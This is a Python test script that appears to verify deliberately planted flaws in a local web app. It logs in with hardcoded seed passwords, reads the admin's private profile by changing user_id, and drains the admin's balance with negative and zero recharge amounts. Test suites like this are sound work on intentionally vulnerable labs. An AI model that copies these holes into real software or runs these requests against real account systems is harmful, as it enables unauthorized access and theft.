#!/usr/bin/env python3
"""
v4alpha Vulnerability Verification Tests
Tests: privilege escalation, unauthorized recharge, negative amounts
"""
import requests
import sys
import re
import sqlite3

BASE = "http://127.0.0.1:8085"
BASE_DIR = "/home/kali/Desktop/agent-project/claude-code-project/v4alpha"
DB_PATH = BASE_DIR + "/data/users.db"
session = requests.Session()

passed = 0
failed = 0

def test(name, condition, detail=""):
    global passed, failed
    if condition:
        passed += 1
        print("  [PASS] " + name)
    else:
        failed += 1
        print("  [FAIL] " + name + " -- " + detail)

def get_csrf(html):
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', html)
    return m.group(1) if m else None

def get_balance(html):
    matches = re.findall(r'value="(\d+)" disabled', html)
    if matches:
        return int(matches[-1])
    return None

def login(username, password):
    r = session.get(BASE + "/login")
    csrf = get_csrf(r.text)
    r = session.post(BASE + "/login", data={
        "csrf_token": csrf or "",
        "username": username,
        "password": password
    }, allow_redirects=False)
    if r.status_code == 302:
        session.get(BASE + "/")
        return True
    return False

def change_password(username, old_pwd, new_pwd):
    r = session.get(BASE + "/change-password")
    csrf = get_csrf(r.text)
    r = session.post(BASE + "/change-password", data={
        "csrf_token": csrf or "",
        "old_password": old_pwd,
        "new_password": new_pwd,
        "confirm_password": new_pwd
    }, allow_redirects=False)
    return r.status_code

def logout_user():
    r = session.get(BASE + "/")
    csrf = get_csrf(r.text)
    if csrf:
        session.post(BASE + "/logout", data={"csrf_token": csrf})

def get_db_balance(uid):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    row = conn.execute("SELECT balance FROM users WHERE uid=?", (uid,)).fetchone()
    conn.close()
    return row["balance"] if row else None

# ========== Setup ==========
print("\n=== Setup: Login as admin (first login) ===")
r = session.get(BASE + "/login")
csrf = get_csrf(r.text)
r = session.post(BASE + "/login", data={
    "csrf_token": csrf or "",
    "username": "admin",
    "password": "Admin@2025#Secure"
}, allow_redirects=False)
if "/change-password" in r.headers.get("Location", ""):
    change_password("admin", "Admin@2025#Secure", "Admin@2025#SecureNew")
    print("  Admin password changed")

print("\n=== Setup: Login as alice (first login) ===")
logout_user()
r = session.get(BASE + "/login")
csrf = get_csrf(r.text)
r = session.post(BASE + "/login", data={
    "csrf_token": csrf or "",
    "username": "alice",
    "password": "Alice@2025#User!"
}, allow_redirects=False)
if "/change-password" in r.headers.get("Location", ""):
    change_password("alice", "Alice@2025#User!", "Alice@2025#UserNew")
    print("  Alice password changed")

# ========== Test 1: Horizontal Privilege Escalation ==========
print("\n=== VULN-1: Profile IDOR - View admin info as alice ===")
logout_user()
# Login as alice
r = session.get(BASE + "/login")
csrf = get_csrf(r.text)
session.post(BASE + "/login", data={
    "csrf_token": csrf or "",
    "username": "alice",
    "password": "Alice@2025#UserNew"
}, allow_redirects=True)
session.get(BASE + "/")

# Visit /profile?user_id=1 (admin's profile as alice)
r = session.get(BASE + "/profile?user_id=1")
test("Alice can view admin profile page (200)", r.status_code == 200)
test("Admin's email visible to alice", "admin@example.com" in r.text)
test("Admin's phone visible to alice", "13800138000" in r.text)
test("Admin's balance visible to alice", "99999" in r.text)
test("Shows admin as username", "admin" in r.text)

# ========== Test 2: Unauthorized recharge (steal money) ==========
print("\n=== VULN-2: Unauthorized recharge - Steal admin's money ===")
r = session.get(BASE + "/profile?user_id=1")
csrf = get_csrf(r.text)
admin_balance_before = get_db_balance(1)
alice_balance_before = get_db_balance(2)
print("  Admin balance before: " + str(admin_balance_before))
print("  Alice balance before: " + str(alice_balance_before))

# POST recharge with user_id=1 and amount=-99999 (admin balance decreases)
r = session.post(BASE + "/recharge", data={
    "csrf_token": csrf or "",
    "user_id": "1",
    "amount": "-99999"
}, allow_redirects=False)
test("Recharge with negative amount for admin redirects", r.status_code == 302)
test("Redirects to /profile?user_id=1", r.headers.get("Location", "").endswith("?user_id=1"))

admin_balance_after = get_db_balance(1)
expected = admin_balance_before - 99999
test("Admin balance decreased: " + str(admin_balance_after) + " == " + str(expected),
     admin_balance_after == expected,
     "Admin balance was " + str(admin_balance_after) + ", expected " + str(expected))

# ========== Test 3: Negative amount ==========
print("\n=== VULN-3: Negative amount -100 ===")
r = session.get(BASE + "/profile?user_id=1")
csrf = get_csrf(r.text)
admin_balance_before2 = get_db_balance(1)

r = session.post(BASE + "/recharge", data={
    "csrf_token": csrf or "",
    "user_id": "1",
    "amount": "-100"
}, allow_redirects=False)
test("Recharge -100 accepted", r.status_code == 302)

admin_balance_after2 = get_db_balance(1)
expected2 = admin_balance_before2 - 100
test("Admin balance decreased by 100: " + str(admin_balance_after2) + " == " + str(expected2),
     admin_balance_after2 == expected2,
     "Was " + str(admin_balance_after2) + ", expected " + str(expected2))

# ========== Test 4: Zero amount accepted ==========
print("\n=== VULN-4: Zero amount accepted ===")
r = session.get(BASE + "/profile?user_id=1")
csrf = get_csrf(r.text)
admin_balance_before3 = get_db_balance(1)

r = session.post(BASE + "/recharge", data={
    "csrf_token": csrf or "",
    "user_id": "1",
    "amount": "0"
}, allow_redirects=False)
test("Recharge 0 accepted", r.status_code == 302)

admin_balance_after3 = get_db_balance(1)
test("Admin balance unchanged after 0", admin_balance_after3 == admin_balance_before3)

# ========== Test 5: All existing features still work ==========
print("\n=== Verify: Existing features still work ===")
# Login as alice, check own profile
r = session.get(BASE + "/login")
csrf = get_csrf(r.text)
session.post(BASE + "/login", data={
    "csrf_token": csrf or "",
    "username": "alice",
    "password": "Alice@2025#UserNew"
}, allow_redirects=True)
session.get(BASE + "/")

r = session.get(BASE + "/profile")
test("Alice own profile shows alice data", "alice" in r.text.lower())

# Check search works
r = session.get(BASE + "/search?keyword=admin")
test("Search works", r.status_code == 200)

# Check index works
r = session.get(BASE + "/")
test("Index page works", r.status_code == 200)

# Check register page works
r = session.get(BASE + "/register")
test("Register page works", r.status_code == 200)

# ========== Summary ==========
print("\n" + "=" * 50)
print("Results: " + str(passed) + " passed, " + str(failed) + " failed out of " + str(passed + failed) + " tests")
print("=" * 50)

if failed > 0:
    sys.exit(1)
else:
    sys.exit(0)
